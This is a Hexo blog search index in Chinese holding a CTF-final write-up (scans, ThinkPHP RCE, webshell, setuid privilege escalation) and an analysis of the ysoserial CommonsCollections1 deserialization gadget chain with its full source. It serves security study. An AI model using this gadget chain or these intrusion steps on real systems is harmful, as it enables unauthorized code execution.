<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>友链</title>
    <url>//py.html</url>
    <content><![CDATA[<p>感谢各位师傅提供的各种帮助</p>
<a id="more"></a>

<ul>
<li><p>  <a href="https://last-las.github.io/">LAS</a></p>
</li>
<li><p><a href="https://550532788.github.io/">Cxlover</a></p>
</li>
<li><p>  <a href="https://0xdktb.top/">0xDktb</a></p>
</li>
<li><p>  <a href="https://xzlang.github.io/">0xDkpdd/XZLang</a></p>
</li>
<li><p>  <a href="http://timelooper.wang">time looper</a></p>
</li>
<li><p>  <a href="https://daddyhonggg.github.io">DDVH</a></p>
</li>
<li><p>  <a href="http://139.155.83.108/">Dreamstalker</a></p>
</li>
<li><p>  <a href="http://118.25.0.135">Abyss</a></p>
</li>
<li><p>  <a href="https://treebacker.github.io">treebacker</a></p>
</li>
<li><p>  <a href="http://www.pwn4fun.com/pwn">Railgun</a></p>
</li>
<li><p>  <a href="http://binlep.top/">BinLep</a></p>
</li>
<li><p>  <a href="https://blog.csdn.net/weixin_44864859">棂星</a></p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Jacobi_fly天翼杯2020WP</title>
    <url>//Jacobi_fly.html</url>
    <content><![CDATA[<p>2020年天翼杯决赛wp by <strong><code>Jacobi_fly</code></strong></p>
<p><strong>Ps: 队友懒得上博客，让我来做，所以有幸给出我们做题的WP</strong></p>
<a id="more"></a>



<p><strong>0xDktb师傅太强了</strong></p>
<p><strong>XZLang师傅太强了</strong></p>
<p><strong>我是废物</strong></p>
<img src="天翼杯2020/image-20200817214034533.png" alt="image-20200817214034533" style="zoom:50%;" />



<p>下面差不多是按照过程整理出来的WP（大概），欢迎各位师傅交流（别骂我呜呜呜）</p>
<h3 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/mWBlpZkSeqI2hof5.jpg!thumbnail.png" alt="img"></p>
<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ulFQZBQ7SbvCE8Bs.jpg!thumbnail.png" alt="img"></p>
<h3 id="flag23"><a href="#flag23" class="headerlink" title="flag23"></a>flag23</h3><p>APK 解压之后，使用**<code>字符串搜索</code>**得到flag，和域名<a href="http://ps.dasctf.wetolink.com/">http://ps.dasctf.wetolink.com</a> </p>
<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/1qsdwRHrNAwAAAgw.png!thumbnail.png" alt="图片"></p>
<p>ping一下得到ip地址 (也可以直接nmap扫自己的ip/24)</p>
<h3 id="Nmap-report"><a href="#Nmap-report" class="headerlink" title="Nmap report"></a>Nmap report</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.12.1 </span><br><span class="line">Host is up (0.10s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE    VERSION </span><br><span class="line">22/tcp   open     ssh        Huawei VRP sshd (protocol 1.99) </span><br><span class="line">23/tcp   filtered telnet </span><br><span class="line">80/tcp   open     http       Huawei S5700-series switch httpd </span><br><span class="line">443/tcp  open     ssl/https? </span><br><span class="line">1045/tcp filtered fpitp </span><br><span class="line">Service Info: OS: VRP; Device: switch; CPE: cpe:/o:huawei:vrp </span><br><span class="line">Nmap scan report for 192.168.12.251 </span><br><span class="line">Host is up (0.15s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line"> </span><br><span class="line">Nmap scan report for 192.168.12.252 </span><br><span class="line">Host is up (0.092s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line">Nmap scan report for ps.dasctf.wetolink.com (192.168.12.253) </span><br><span class="line">Host is up (0.081s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br></pre></td></tr></table></figure>

<h3 id="flag17"><a href="#flag17" class="headerlink" title="flag17"></a>flag17</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/oASq6jCeYwtsQUIF.png!thumbnail.png" alt="图片"></p>
<h3 id="flag18"><a href="#flag18" class="headerlink" title="flag18"></a>flag18</h3><p>查看<code>robots.txt</code> ，里面有一个链接，进入之后看到是</p>
<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/3EwJGFPP1VmIO2lu.png!thumbnail.png" alt="图片"></p>
<p>得到flag18 </p>
<h3 id="flag9"><a href="#flag9" class="headerlink" title="flag9"></a>flag9</h3><p>80端口登录失败给flag9 </p>
<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/maRrU72gyrotFALt.png!thumbnail.png" alt="图片"></p>
<h3 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a>flag7</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/hKzubHKKLzdN8jYu.png!thumbnail.png" alt="图片"></p>
<p><code>robots.txt</code> 文件直接给flag7 </p>
<h3 id="192-168-12-253-8888目录扫描结果"><a href="#192-168-12-253-8888目录扫描结果" class="headerlink" title="192.168.12.253:8888目录扫描结果"></a>192.168.12.253:8888目录扫描结果</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[10:48:31] Starting: </span><br><span class="line">[10:48:35] 200 -    6KB - /.DS_Store </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login.html </span><br><span class="line">[10:49:12] 200 -    5KB - /Admin/login / </span><br><span class="line">[10:50:02] 200 -    0B  - /backup/ </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin/admin.asp </span><br><span class="line">[10:51:05] 200 -   18KB - /Index </span><br><span class="line">[10:51:05] 200 -   18KB - /index </span><br><span class="line">[10:51:06] 200 -   18KB - /index.html </span><br><span class="line">[10:51:06] 200 -   18KB - /index.php </span><br><span class="line">[10:51:06] 200 -    7KB - /index.php/login/ </span><br><span class="line">[10:51:24] 200 -    7KB - /login </span><br><span class="line">[10:51:24] 200 -    7KB - /Login </span><br><span class="line">[10:51:25] 200 -    7KB - /login.html </span><br><span class="line">[10:51:25] 200 -    7KB - /Login.html </span><br><span class="line">[10:51:26] 200 -    7KB - /login/ </span><br><span class="line">[10:51:26] 200 -    7KB - /login/admin/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/admin/admin.asp </span><br><span class="line">[10:51:27] 200 -    7KB - /login/administrator/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel.%2A </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel/ </span><br><span class="line">[10:51:45] 200 -    7KB - /login/index </span><br><span class="line">[10:51:45] 200 -    7KB - /login/login </span><br><span class="line">[10:51:45] 200 -    7KB - /login/oauth/ </span><br><span class="line">[10:51:46] 200 -    7KB - /login/super </span><br><span class="line">[10:52:07] 200 -    3KB - /README.md </span><br><span class="line">[10:52:09] 200 -  130B  - /robots.txt </span><br><span class="line">[10:52:31] 200 -   24KB - /register </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/autoload.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_files.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_classmap.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_namespaces.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_psr4.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_real.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_static.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/ClassLoader.php </span><br><span class="line">[10:52:41] 200 -   23KB - /vendor/composer/installed.json </span><br><span class="line">[10:52:41] 200 -    1KB - /vendor/composer/LICENSE </span><br></pre></td></tr></table></figure>

<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>是一个<code>thinkphp</code>，经过测试得到版本是<code>5.0.14</code>使用kali的<code>seachsploit</code>，找到一个payload </p>
<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/S7N4aR0VTvVh7rZp.png!thumbnail.png" alt="图片"></p>
<p>s参数是一个RCE，写入一句话木马，使用蚁剑连接，得到后门 </p>
<h3 id="flag1-amp-amp-flag5"><a href="#flag1-amp-amp-flag5" class="headerlink" title="flag1 &amp;&amp; flag5"></a>flag1 &amp;&amp; flag5</h3><p>在<code>/home</code>目录下发现flag1和flag5，其中flag1可以直接读 </p>
<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/kf3ZiTKPfXAnEbIG.png!thumbnail.png" alt="图片"></p>
<p>flag5需要root权限， </p>
<p>找一下<code>setuid</code>的东西，找到一个<code>nl</code> </p>
<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/XxkZNxARcAaQfu9Z.png!thumbnail.png" alt="图片"></p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看<code>/var/www/html/application/database.php</code>，数据库配置的是内网的一台主机。 </p>
<p>用冰蝎连接查询flag: </p>
<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/u9enAOu1xXM94wGP.png!thumbnail.png" alt="图片"></p>
<p>或者查看<code>/proc/net/arp</code>也可以发现内网的主机。 </p>
<h3 id="flag19"><a href="#flag19" class="headerlink" title="flag19"></a>flag19</h3><p>在80端口使用CBC字节翻转攻击的时候，解码<code>cookie</code>时发现。 </p>
<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/stkRZawsSKCozytq.jpg!thumbnail.png" alt="图片"></p>
<h3 id="flag22"><a href="#flag22" class="headerlink" title="flag22"></a>flag22</h3><p>登录完之后，上传 <code>test.avi</code> 然后下载，之后拿到 .avi 播放，获得 flag。 </p>
<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ovsCwUxRD94gsU4e.jpg!thumbnail.png" alt="图片"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>是Jacobi_fly队伍的出道战役（以前不叫这名</p>
<p>也是我们目前取得的最好的成绩，这里特别感谢我的队友们</p>
<ul>
<li><p>初赛由淘宝师傅一人carry，带着一道题没做出来的我和做了签到题的XZLang进入复赛</p>
</li>
<li><p>这次淘宝师傅又carry了，大多数flag都是由他交上，一人狂砍1000+分（x</p>
</li>
<li><p>XZLang师傅也很NB</p>
</li>
<li><p><font color='red'>只有我是废物呜呜呜</font></p>
</li>
</ul>
<p>​    </p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>天翼杯</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonCollections1 分析</title>
    <url>//CommonCollections1.html</url>
    <content><![CDATA[<p>对<code>ysoserial</code>工具中<code>CommonCollections1</code>利用链分析，跟踪调试。</p>
<a id="more"></a>



<h1 id="CommonCollections1"><a href="#CommonCollections1" class="headerlink" title="CommonCollections1"></a>CommonCollections1</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">				Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">					AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">						LazyMap.get()</span></span><br><span class="line"><span class="comment">							ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">								ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Class.getMethod()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.exec()</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>





<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h4 id="CommonCollections1-java"><a href="#CommonCollections1-java" class="headerlink" title="CommonCollections1.java"></a>CommonCollections1.java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">InvocationHandler</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">		<span class="comment">// inert chain for setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">			<span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">		<span class="comment">// real chain for after setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">					String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">					<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">					Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">					<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">				<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">					<span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">		Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> handler;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	    String command[] = &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;;</span><br><span class="line">	    PayloadRunner.run(CommonsCollections1.class, command);</span><br><span class="line">		<span class="comment">// PayloadRunner.run(CommonsCollections1.class, args);</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ChainedTransformer</code>是一个实现了<code>Transformmer</code>和<code>Serializable</code>接口的对象</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="Transformer-java"><a href="#Transformer-java" class="headerlink" title="Transformer.java"></a>Transformer.java</h3><p><code>Transformer</code>接口里面只有一个<code>Transform</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input object (leaving it unchanged) into some output object.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the object to be transformed, should be left unchanged</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a transformed object</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ClassCastException (runtime) if the input is the wrong class</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException (runtime) if the input is invalid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> FunctorException (runtime) if the transform cannot be completed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而这个<code>Transform</code>方法会在后面的gadget中被使用到</p>
<h3 id="ChainedTransformer-java"><a href="#ChainedTransformer-java" class="headerlink" title="ChainedTransformer.java"></a>ChainedTransformer.java</h3><p>在<code>ChianedTransformer</code>对象中，实现的<code>Transform</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">*/</span>    </span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注释里说明了这个方法的作用</p>
<blockquote>
<p>  通过每个修饰的变换器将输入转换为结果</p>
</blockquote>
<p>看代码可以知道，这个方法是把<code>iTransformers</code>里的对象的<code>transform</code>方法的输出变成下一个对象的输入。</p>
<p>也就是类似于下图的流程</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201205120358340.png" alt="image-20201205120358340"></p>
<p>在本gadget中，<code>ChainedTransformer</code>存放了一个<code>Transform</code>数组</p>
<p>里面分别是<code>ConstantTransformer, InvokeTransformer * 3, 1</code></p>
<h3 id="ConstansTransformer-java"><a href="#ConstansTransformer-java" class="headerlink" title="ConstansTransformer.java"></a>ConstansTransformer.java</h3><p>要关注的只有<code>Transform</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不管输入什么值，<code>Transform</code>方法都会返回一个<code>iConstant</code>对象，这个<code>iConstant</code>对象在构造的时候传入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说，不管传入的是啥都会返回构造的时候给的类。在上面的利用链中就是<code>RunTime.class</code></p>
<h3 id="InvokeTransformer-java"><a href="#InvokeTransformer-java" class="headerlink" title="InvokeTransformer.java"></a>InvokeTransformer.java</h3><p>同样要关注<code>Transform</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入一个参数，会通过<code>iParamTypes</code>找到这个参数的<code>iMethodName</code>方法，并把<code>iArgs</code>，作为参数传入其中，调用方法。</p>
<p>其中<code>iMethodName</code>，<code>iParamTypes</code>，<code>iArgs</code>都是构造时传入的参数。</p>
<h3 id="chain"><a href="#chain" class="headerlink" title="chain"></a>chain</h3><p>通过上面的几个<code>Transformer</code>，最终得出的调用顺序为</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201205122505998.png" alt="image-20201205122505998"></p>
<p>这样就可以执行任意命令。</p>
<p>但是上面的还不是很完备，因为这个只有当<code>ChainedTransformer</code>对象的<code>Transform</code>方法被调用时才能触发。所以用到了<code>LazyMap</code>。</p>
<h3 id="LazyMap-java"><a href="#LazyMap-java" class="headerlink" title="LazyMap.java"></a>LazyMap.java</h3><p>在<code>LazyMap</code>中的<code>get</code>方法使用到了<code>transform</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</span><br><span class="line">        Object value = factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>factory</code>对象在静态方法<code>decorate</code>中被赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后问题就变成了如何才能调用<code>LazyMap.get()</code>方法了</p>
<p>需要找一个能够在<code>readObject</code>中调用<code>get()</code>方法的类</p>
<p>这个类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p>
<h3 id="AnnotationInvocationHandler-java"><a href="#AnnotationInvocationHandler-java" class="headerlink" title="AnnotationInvocationHandler.java"></a>AnnotationInvocationHandler.java</h3><p>由于我这没有下载源码，看到的代码是反编译.class文件的结果，所以有些出入，但是不影响分析。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var3 = var2.memberTypes();</span><br><span class="line">    Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Entry var5 = (Entry)var4.next();</span><br><span class="line">        String var6 = (String)var5.getKey();</span><br><span class="line">        Class var7 = (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object var8 = var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要看<code>while</code>内部的代码，发现里面使用到了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map var3 = var2.memberTypes();</span><br><span class="line">...</span><br><span class="line">String var6 = (String) var5.getKey();</span><br><span class="line">Class var7 = (Class)var3.get(var6);</span><br></pre></td></tr></table></figure>

<p>调用了<code>get()</code>方法</p>
